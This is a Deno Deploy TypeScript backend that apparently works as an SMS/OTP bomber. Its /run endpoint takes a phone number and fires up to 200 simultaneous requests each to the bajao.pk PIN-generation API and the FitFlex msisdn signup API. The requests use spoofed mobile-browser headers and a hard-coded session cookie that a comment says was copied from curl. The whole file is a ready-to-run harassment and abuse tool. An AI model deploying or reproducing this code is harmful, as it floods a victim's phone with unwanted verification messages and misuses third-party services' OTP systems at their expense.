// main.ts — Deno Deploy backend (FIXED)
const BAJAO_URL = 'https://bajao.pk/api/v2/login/generatePinV2?siteid&selOperator=2';
const FITFLEX_URL = 'https://prod.fitflexapp.com/api/users/signupV1';

const UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36';

// 🔥 Yeh cookie bajao.pk ki hai — curl se copy ki
const BAJAO_COOKIE = 'JSESSIONID=662C09F1B98C698F16D182AB76A39B64; userId=1790477302038; G_ENABLED_IDPS=google; noo-playlist=; DVID=1790477307003; _gcl_au=1.1.1373219935.1790477308; _ga=GA1.1.642208451.1790477308; _ga_4JGGKSBQDG=GS2.1.s1790477307$o1$g1$t1790477312$j55$l0$h0; _tt_enable_cookie=1; _ttp=01M3GC79G7VBN49QYE2S96KBGG_.tt.1.1790477313544; _fbp=fb.1.1790477313715.275511547957534248';

const CORS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type, X-Auth-Token',
};

function toIntl(num: string): string {
  let s = String(num).replace(/\D/g, '');
  if (s.startsWith('0')) s = s.slice(1);
  if (!s.startsWith('92')) s = '92' + s;
  return s;
}

function log(tag: string, msg: string) {
  console.log(`[${new Date().toISOString()}] [${tag}] ${msg}`);
}

// ---------- BAJAO ----------
async function fireBajao(uuid: string, idx: number): Promise<{status: number, body: string}> {
  try {
    const body = new URLSearchParams();
    body.append('uuid', uuid);

    const res = await fetch(BAJAO_URL, {
      method: 'POST',
      headers: {
        'User-Agent': UA,
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-PK,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://bajao.pk',
        'Referer': 'https://bajao.pk/create',
        'Cookie': BAJAO_COOKIE,
        'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
      },
      body: body.toString(),
      redirect: 'manual',
    });

    const txt = await res.text();
    log(`BAJAO #${idx}`, `uuid=${uuid} → HTTP ${res.status} | ${txt.slice(0, 80)}`);
    return { status: res.status, body: txt };
  } catch (e) {
    log(`BAJAO #${idx}`, `ERR: ${e}`);
    return { status: 0, body: String(e) };
  }
}

// ---------- FITFLEX ----------
async function fireFitflex(msisdn: string, idx: number): Promise<{status: number, body: string}> {
  try {
    const payload = JSON.stringify({
      msisdn: msisdn,
      type: 'msisdn',
      device_name: 'Netscape',
      app_version: '1.0',
      user_platform: UA,
    });

    const res = await fetch(FITFLEX_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept': '*/*',
        'Accept-Language': 'en-PK,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'Origin': 'https://fitflexapp.com',
        'Referer': 'https://fitflexapp.com/',
        'User-Agent': UA,
        'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'Sec-Fetch-Site': 'same-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
      },
      body: payload,
      redirect: 'manual',
    });

    const txt = await res.text();
    log(`FITFLEX #${idx}`, `msisdn=${msisdn} → HTTP ${res.status} | ${txt.slice(0, 80)}`);
    return { status: res.status, body: txt };
  } catch (e) {
    log(`FITFLEX #${idx}`, `ERR: ${e}`);
    return { status: 0, body: String(e) };
  }
}

// ---------- MAIN ----------
Deno.serve(async (req: Request) => {
  const url = new URL(req.url);

  if (req.method === 'OPTIONS') {
    return new Response(null, { status: 204, headers: CORS });
  }

  if (url.pathname === '/run') {
    const num = (url.searchParams.get('num') || '').trim();
    const countStr = url.searchParams.get('count') || '50';
    let count = parseInt(countStr, 10);
    if (!Number.isFinite(count) || count < 1) count = 50;
    if (count > 200) count = 200;

    if (!num) {
      return new Response(JSON.stringify({ ok: false, error: 'no number' }), {
        status: 400, headers: { 'Content-Type': 'application/json', ...CORS },
      });
    }

    const uuid = num;
    const msisdn = toIntl(num);

    log('API', `Received num=${num} count=${count}`);

    // Fire all at once
    const tasks: Promise<{status: number, body: string}>[] = [];
    for (let i = 1; i <= count; i++) {
      tasks.push(fireBajao(uuid, i));
      tasks.push(fireFitflex(msisdn, i));
    }

    const results = await Promise.all(tasks);

    let okBajao = 0, okFit = 0, failBajao = 0, failFit = 0;
    const sampleBajao: string[] = [];
    const sampleFit: string[] = [];

    for (let i = 0; i < results.length; i++) {
      const r = results[i];
      const isBajao = i % 2 === 0;
      const good = r.status >= 200 && r.status < 300;
      if (isBajao) {
        if (good) okBajao++; else failBajao++;
        if (sampleBajao.length < 3) sampleBajao.push(`${r.status}: ${r.body.slice(0, 100)}`);
      } else {
        if (good) okFit++; else failFit++;
        if (sampleFit.length < 3) sampleFit.push(`${r.status}: ${r.body.slice(0, 100)}`);
      }
    }

    log('BURST', `BAJAO ok=${okBajao} fail=${failBajao} | FITFLEX ok=${okFit} fail=${failFit}`);

    return new Response(JSON.stringify({
      ok: true,
      uuid, msisdn, count,
      bajao: { ok: okBajao, fail: failBajao, samples: sampleBajao },
      fitflex: { ok: okFit, fail: failFit, samples: sampleFit },
      total: results.length,
    }), {
      status: 200,
      headers: { 'Content-Type': 'application/json', ...CORS },
    });
  }

  // debug endpoint — ek hi request bhej ke poori detail dekho
  if (url.pathname === '/debug') {
    const num = (url.searchParams.get('num') || '').trim();
    if (!num) return new Response('no num', { status: 400, headers: CORS });
    const b = await fireBajao(num, 0);
    const f = await fireFitflex(toIntl(num), 0);
    return new Response(JSON.stringify({
      bajao: { status: b.status, body: b.body.slice(0, 500) },
      fitflex: { status: f.status, body: f.body.slice(0, 500) },
    }), {
      status: 200, headers: { 'Content-Type': 'application/json', ...CORS },
    });
  }

  return new Response('Not Found', { status: 404, headers: CORS });
});
